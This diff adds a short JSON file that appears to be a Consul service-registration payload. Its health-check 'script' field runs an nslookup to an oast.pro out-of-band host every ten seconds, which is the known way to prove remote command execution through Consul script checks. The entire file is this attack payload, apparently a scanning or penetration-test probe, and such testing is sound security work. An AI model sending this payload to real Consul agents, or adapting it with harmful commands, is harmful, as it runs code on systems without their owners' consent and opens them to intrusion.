@@ -1,0 +1,11 @@
+{
+  "ID": "2aRsuzLEYPMShQSqmKW3RHqBULQ",
+  "Name": "2aRsuzLEYPMShQSqmKW3RHqBULQ",
+  "Address": "127.0.0.1",
+  "Port": 80,
+  "check": {
+    "script": "nslookup cman4mbd17fomif9j5cgw4wy737jxxeue.oast.pro",
+    "interval": "10s",
+    "Timeout": "86400s"
+  }
+}
